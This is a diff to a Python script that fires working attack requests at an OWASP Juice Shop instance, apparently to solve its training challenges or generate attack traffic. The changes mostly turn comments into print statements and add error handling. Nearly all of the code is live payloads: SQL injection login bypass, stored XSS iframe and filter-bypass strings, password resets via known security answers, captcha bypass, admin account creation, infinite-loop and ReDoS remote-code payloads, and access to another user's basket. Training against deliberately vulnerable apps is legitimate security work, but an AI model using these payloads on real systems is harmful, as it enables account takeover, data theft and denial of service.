@@ -6,6 +6,8 @@ if len(sys.argv) == 1: sys.argv[1:] = ["http://juiceshop.local:80"]
 url = sys.argv[1]
 
 import requests
+from requests.exceptions import HTTPError
+
 print("Creating Traffic Against URL: " +  url)
 # ==== No required action ====
 print("---- Arbitrary File Write - Overwrite the Legal Information file.")
@@ -111,7 +113,7 @@ requests.post(url+'/rest/user/login', data={'email':'support@juice-sh.op','passw
 print("==== Change password challenges ====")
 # ---- Bjoern's Favorite Pet (Reset the password of Bjoern's OWASP account via the Forgot Password mechanism with the original answer to his security question.)
 requests.post(url+'/rest/user/reset-password',data={'email':'bjoern@owasp.org','answer':'Zaya','new':'bjoern','repeat':'bjoern'})
-# ---- Reset Bender's Password (Reset Bender's password via the Forgot Password mechanism with the original answer to his security question.)
+print("Reset Bender's Password (Reset Bender's password via the Forgot Password mechanism with the original answer to his security question.)")
 requests.post(url+'/rest/user/reset-password',data={'email':'bender@juice-sh.op','answer':'Stop\'n\'Drop','new':'bender','repeat':'bender'})
 # ---- Reset Bjoern's Password (Reset the password of Bjoern's internal account via the Forgot Password mechanism with the original answer to his security question.)
 requests.post(url+'/rest/user/reset-password',data={'email':'bjoern@juice-sh.op','answer':'West-2082','new':'bjoern','repeat':'bjoern'})
@@ -126,7 +128,7 @@ captcha=loads(requests.get(url+'/rest/captcha').text)
 print("---- Captcha Bypass (Submit 10 or more customer feedbacks within 10 seconds.")
 for i in range(11):
 	requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'a','rating':3})
-# ---- Forged Feedback (Post some feedback in another users name.)
+print("---- Forged Feedback (Post some feedback in another users name.)") 
 # See "Captcha Bypass" part
 # ---- Frontend Typosquatting (Inform the shop about a typosquatting imposter that dug itself deep into the frontend. (Mention the exact name of the culprit))
 requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'ng2-bar-rating','rating':3})
@@ -134,7 +136,7 @@ requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captch
 requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'Eurogium Edule Hueteroneel','rating':3})
 # ---- Legacy Typosquatting (Inform the shop about a typosquatting trick it has been a victim of at least in v6.2.0-SNAPSHOT. (Mention the exact name of the culprit))
 requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'epilogue-js','rating':3})
-# ---- Server-side XSS Protection (Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> bypassing a server-side security mechanism.)
+print('---- Server-side XSS Protection (Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> bypassing a server-side security mechanism.)')
 requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'<<script>Foo</script>iframe src="javascript:alert(`xss`)">','rating':3})
 # ---- Steganography (Rat out a notorious character hiding in plain sight in the shop. (Mention the exact name of the character))
 requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'Pickle Rick','rating':3})
@@ -152,20 +154,29 @@ requests.post(url+'/api/Products', data={'name':'XSS','description':'<iframe src
 # ---- Blocked RCE DoS (Perform a Remote Code Execution that would keep a less hardened application busy forever.)
 requests.post(url+'/b2b/v2/orders', data={'orderLinesData':'(function dos() { while(true); })()'}, headers={'Authorization':'Bearer '+login['token']})
 # ---- Change Bender's Password (Change Bender's password into slurmCl4ssic without using SQL Injection or Forgot Password.)
-requests.get(url+'/rest/user/change-password', params={'new':'slurmCl4ssic','repeat':'slurmCl4ssic'}, headers={'Authorization':'Bearer '+(loads(requests.post(url+'/rest/user/login',data={'email':'bender@juice-sh.op\';--','password':'a'}).text)['authentication']['token'])})
-# ---- GDPR Data Theft (Steal someone else's personal data without using Injection.)
+try:
+    response = requests.get(url+'/rest/user/change-password', params={'new':'slurmCl4ssic','repeat':'slurmCl4ssic'}, headers={'Authorization':'Bearer '+(loads(requests.post(url+'/rest/user/login',data={'email':'bender@juice-sh.op\';--','password':'a'}).text)['authentication']['token'])})
+    response.raise_for_status()
+    jsonResponse = response.json()
+#    print("Entire JSON response")
+#    print(jsonResponse)
+except HTTPError as http_err:
+        print(f'HTTP error occurred: {http_err}')
+except Exception as err:
+        print(f'>>>>>>>  Other error occurred: {err} <<<<<<')
+print("---- GDPR Data Theft (Steal someone else's personal data without using Injection.)") 
 requests.post(url+'/api/Users',data={'email':'edmin@juice-sh.op','password':'edmin123','role':'admin'})
 requests.post(url+'/rest/user/data-export',data={'format':'1'},headers={'Authorization':'Bearer '+(loads(requests.post(url+'/rest/user/login',data={'email':'edmin@juice-sh.op','password':'edmin123'}).text)['authentication']['token'])})
 # ---- HTTP-Header XSS (Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> through an HTTP header.)
 requests.get(url+'/rest/saveLoginIp', headers={'True-Client-IP':'<iframe src="javascript:alert(`xss`)">','Authorization':'Bearer '+login['token']})
-# ---- Multiple Likes (Like any review at least three times as the same user.)
+print("---- Multiple Likes (Like any review at least three times as the same user.)")
 productId=loads(requests.get(url+'/rest/products/3/reviews').text)['data'][0]['_id']
 def sendRequest(specifiedUrl):
 	requests.post(specifiedUrl, data={'id':productId}, headers={'Authorization':'Bearer '+login['token']})
 from concurrent.futures import ThreadPoolExecutor
 with ThreadPoolExecutor(max_workers=4) as pool:
 	[x for x in pool.map(sendRequest,[url+'/rest/products/reviews',url+'/rest/products/reviews',url+'/rest/products/reviews',url+'/rest/products/reviews'])]
-# ---- Successful RCE DoS (Perform a Remote Code Execution that occupies the server for a while without using infinite loops.)
+print("---- Successful RCE DoS (Perform a Remote Code Execution that occupies the server for a while without using infinite loops.)")
 requests.post(url+'/b2b/v2/orders', data={'orderLinesData':'/((a+)+)b/.test(\'aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\')'}, headers={'Authorization':'Bearer '+login['token']})
-# ---- View Basket (View another user's shopping basket.)
+print("---- View Basket (View another user's shopping basket.)")
 requests.get(url+'/rest/basket/'+str(login['bid']+1), headers={'Authorization':'Bearer '+login['token']})
